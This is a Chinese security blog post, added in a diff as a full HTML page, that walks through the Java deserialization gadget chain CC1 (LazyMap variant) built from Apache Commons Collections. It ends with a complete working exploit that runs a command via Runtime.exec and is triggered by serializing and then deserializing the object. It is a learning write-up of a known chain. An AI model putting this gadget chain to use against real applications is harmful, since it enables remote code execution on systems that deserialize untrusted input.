@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="参考链接https:&#x2F;&#x2F;y0n3er.github.io&#x2F;undefined&#x2F;36068.htmlhttps:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1yP4y1p7N7&#x2F; 攻击链分析这里直接用ysoserial上的链子，和TransformedMap对比一下可以看到，把TransformedMap改成LazyMap了，然后两个AnnotationInvacationHandler下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化 CC1-LazyMap链">
+<meta property="og:url" content="https://jaspersec.top/posts/1914772217.html">
+<meta property="og:site_name" content="Jasper_sec">
+<meta property="og:description" content="参考链接https:&#x2F;&#x2F;y0n3er.github.io&#x2F;undefined&#x2F;36068.htmlhttps:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1yP4y1p7N7&#x2F; 攻击链分析这里直接用ysoserial上的链子，和TransformedMap对比一下可以看到，把TransformedMap改成LazyMap了，然后两个AnnotationInvacationHandler下">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691114999302-627d8b65-71be-4155-adc3-6fa65792afaf.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691115993986-e1c6d74c-143f-43a1-a6d7-217a87fe54e8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691116031299-bdfb25a0-fbd1-4df3-89e3-797a1d3a7649.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691116201289-7b66d78a-073c-4333-b31f-124d15824afc.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691116390592-f32c2188-346c-4e27-b3c3-3efe72e7fca5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691116695638-62b89028-483a-406c-994f-fe3170c93c89.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691116902741-9654e360-17c6-4024-98dd-7dd02eda6827.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691117464347-e343a1f5-c284-4376-9e0a-cc115ede3ee3.png">
+<meta property="article:published_time" content="2023-12-23T17:32:20.000Z">
+<meta property="article:modified_time" content="2025-03-31T22:09:47.219Z">
+<meta property="article:author" content="Jasper_sec">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="CC">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691114999302-627d8b65-71be-4155-adc3-6fa65792afaf.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java反序列化 CC1-LazyMap链</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Jasper_sec" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span> 
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/2328081059.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/264373921.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/posts/1914772217.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/posts/1914772217.html&text=Java反序列化 CC1-LazyMap链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/posts/1914772217.html&title=Java反序列化 CC1-LazyMap链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/posts/1914772217.html&is_video=false&description=Java反序列化 CC1-LazyMap链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java反序列化 CC1-LazyMap链&body=Check out this article: https://jaspersec.top/posts/1914772217.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/posts/1914772217.html&title=Java反序列化 CC1-LazyMap链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/posts/1914772217.html&title=Java反序列化 CC1-LazyMap链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/posts/1914772217.html&title=Java反序列化 CC1-LazyMap链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/posts/1914772217.html&title=Java反序列化 CC1-LazyMap链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/posts/1914772217.html&name=Java反序列化 CC1-LazyMap链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/posts/1914772217.html&t=Java反序列化 CC1-LazyMap链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <!-- 
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">攻击链分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E5%86%99EXP"><span class="toc-number">3.</span> <span class="toc-text">编写EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LazyMap-get"><span class="toc-number">3.1.</span> <span class="toc-text">LazyMap.get()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AnnotationInvocationHandler-invoke"><span class="toc-number">3.2.</span> <span class="toc-text">AnnotationInvocationHandler.invoke()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AnnotationInvocationHandler-readObject"><span class="toc-number">3.3.</span> <span class="toc-text">AnnotationInvocationHandler.readObject()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88EXP"><span class="toc-number">3.4.</span> <span class="toc-text">最终EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">小结</span></a></li></ol>
+      </div>
+     -->
+    <div id="toc">
+      <div id="toc-div" class="toc-article" >
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">攻击链分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E5%86%99EXP"><span class="toc-number">3.</span> <span class="toc-text">编写EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LazyMap-get"><span class="toc-number">3.1.</span> <span class="toc-text">LazyMap.get()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AnnotationInvocationHandler-invoke"><span class="toc-number">3.2.</span> <span class="toc-text">AnnotationInvocationHandler.invoke()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AnnotationInvocationHandler-readObject"><span class="toc-number">3.3.</span> <span class="toc-text">AnnotationInvocationHandler.readObject()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88EXP"><span class="toc-number">3.4.</span> <span class="toc-text">最终EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">小结</span></a></li></ol>
+        
+      </div>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java反序列化 CC1-LazyMap链
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Jasper_sec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-12-23T17:32:20.000Z" class="dt-published" itemprop="datePublished">2023-12-24</time>
+        
+        (Updated: <time datetime="2025-03-31T22:09:47.219Z" class="dt-updated" itemprop="dateModified">2025-04-01</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CC/" rel="tag">CC</a>, <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://y0n3er.github.io/undefined/36068.html">https://y0n3er.github.io/undefined/36068.html</a><br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1yP4y1p7N7/">https://www.bilibili.com/video/BV1yP4y1p7N7/</a></p>
+<h1 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h1><p>这里直接用ysoserial上的链子，和TransformedMap对比一下<br>可以看到，把TransformedMap改成LazyMap了，然后两个AnnotationInvacationHandler<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691114999302-627d8b65-71be-4155-adc3-6fa65792afaf.png" alt="image.png"><br>下面分析一下gadget链子：</p>
+<ol>
+<li>InvokerTransformer.transform()能够执行命令</li>
+<li>LazyMap.get()能够调用xxx.transform()，xxx对象可控</li>
+<li>AnnotationInvocationHandler.invoke()调用了xxx.get()，xxx对象可控</li>
+<li>AnnotationInvocationHandler.readObject()调用了xxx.entrySet()，<strong>xxx可控制为代理对象</strong></li>
+</ol>
+<h1 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h1><p>前面和TransformedMap一样，这里直接从LazyMap开始。</p>
+<h2 id="LazyMap-get"><a href="#LazyMap-get" class="headerlink" title="LazyMap.get()"></a>LazyMap.get()</h2><p>get()里调用了factory.transform(key)，用了ConstantTransformer辅助类，就不用管这个key参数</p>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691115993986-e1c6d74c-143f-43a1-a6d7-217a87fe54e8.png" alt="image.png"></p>
+<p>map和factory都是可以控制的，factory传那个chainedTransformer对象，map绕绕if判断就好</p>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691116031299-bdfb25a0-fbd1-4df3-89e3-797a1d3a7649.png" alt="image.png"></p>
+<p>尝试构造EXP：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">lazyMap.get(<span class="string">&quot;Jasper&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691116201289-7b66d78a-073c-4333-b31f-124d15824afc.png" alt="image.png"></p>
+<h2 id="AnnotationInvocationHandler-invoke"><a href="#AnnotationInvocationHandler-invoke" class="headerlink" title="AnnotationInvocationHandler.invoke()"></a>AnnotationInvocationHandler.invoke()</h2><p>这个invoke()实际上就是<strong>动态代理</strong>用的，创建代理对象语句Proxy.newProxyInstance()的参数里如果传了这个AnnotationInvocationHandler的对象，<strong>创建出来的代理对象不管调什么方法都会走进invoke()方法</strong>。</p>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691116390592-f32c2188-346c-4e27-b3c3-3efe72e7fca5.png" alt="image.png"></p>
+<p>memberValues也是可控的，这里要传LazyMap的对象lazymap</p>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691116695638-62b89028-483a-406c-994f-fe3170c93c89.png" alt="image.png"></p>
+<h2 id="AnnotationInvocationHandler-readObject"><a href="#AnnotationInvocationHandler-readObject" class="headerlink" title="AnnotationInvocationHandler.readObject()"></a>AnnotationInvocationHandler.readObject()</h2><p>这里其实不一定要这个类，只要找到能控制传一个代理对象.方法()的类就行<br>上面知道这个memberValues是可控的，这里的我们传lazyMap对象的代理对象lazyMapProxy<br>lazyMapProxy.entrySet()就会走进上面的invoke()</p>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691116902741-9654e360-17c6-4024-98dd-7dd02eda6827.png" alt="image.png"></p>
+<h2 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC1</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//CC1-TransformedMap</span></span><br><span class="line"><span class="comment">//        Transformer[] transformers =  new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">//                new ConstantTransformer(Runtime.class),</span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),</span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;Calc&quot;&#125;)</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        Transformer chainedTransformer = new ChainedTransformer(transformers);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        hashMap.put(&quot;value&quot;,&quot;Jasper&quot;);</span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap,null,chainedTransformer);</span></span><br><span class="line"><span class="comment">//        Class aihClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//        Constructor aihConstructor = aihClass.getDeclaredConstructor(Class.class,Map.class);</span></span><br><span class="line"><span class="comment">//        aihConstructor.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        Object o = aihConstructor.newInstance(Target.class,transformedMap);</span></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line"><span class="comment">//        unserialize();</span></span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        serialize(aih2);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1691117464347-e343a1f5-c284-4376-9e0a-cc115ede3ee3.png" alt="image.png"></p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>经过之前跟的链子，这条跟起来十分轻松，主要是学习动态代理花了不少时间，基础有点差。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">攻击链分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E5%86%99EXP"><span class="toc-number">3.</span> <span class="toc-text">编写EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LazyMap-get"><span class="toc-number">3.1.</span> <span class="toc-text">LazyMap.get()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AnnotationInvocationHandler-invoke"><span class="toc-number">3.2.</span> <span class="toc-text">AnnotationInvocationHandler.invoke()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AnnotationInvocationHandler-readObject"><span class="toc-number">3.3.</span> <span class="toc-text">AnnotationInvocationHandler.readObject()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88EXP"><span class="toc-number">3.4.</span> <span class="toc-text">最终EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">小结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/posts/1914772217.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/posts/1914772217.html&text=Java反序列化 CC1-LazyMap链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
